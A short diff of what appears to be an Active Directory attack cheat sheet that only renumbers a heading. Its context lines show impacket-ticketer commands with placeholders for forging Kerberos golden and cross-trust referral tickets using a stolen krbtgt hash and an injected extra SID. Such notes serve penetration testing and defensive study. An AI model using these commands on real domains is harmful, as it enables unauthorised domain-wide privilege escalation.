@@ -68,7 +68,7 @@ impacket-ticketer -nthash "<krbtgtNThash>" -domain-sid "<domainSID>" -domain "<D
 impacket-ticketer -nthash "<hash>" -domain-sid "<domain-sid>" -domain "<domain-FQDN>" -extra-sid "<target_domain_SID-RID>" "<someusername>"
 ```
 
-# 1. Trust - forge the referral ticket
+# Trust - forge the referral ticket
 ```
 impacket-ticketer -nthash "<hash>" -domain-sid "<domain-sid>" -domain "<domain-FQDN>" -extra-sid "<target_domain_SID-RID>" -spn "krbtgt/<domain-FQDN>" "someusername"
 ```
